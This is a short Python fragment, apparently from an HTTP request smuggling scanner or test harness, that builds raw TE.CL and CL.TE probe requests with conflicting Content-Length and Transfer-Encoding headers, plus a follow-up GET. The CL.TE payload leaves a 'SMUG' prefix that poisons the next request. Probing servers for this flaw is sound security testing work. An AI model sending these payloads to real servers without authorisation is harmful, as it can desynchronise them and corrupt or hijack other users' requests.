def followup_get(host, close=True):
    return (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: {'close' if close else 'keep-alive'}\r\n"
        "\r\n"
    )

def tecl_top(host):
    return (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: keep-alive\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n\r\n"
    )

def clte_top(host):
    return (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Connection: keep-alive\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "SMUG"
    )
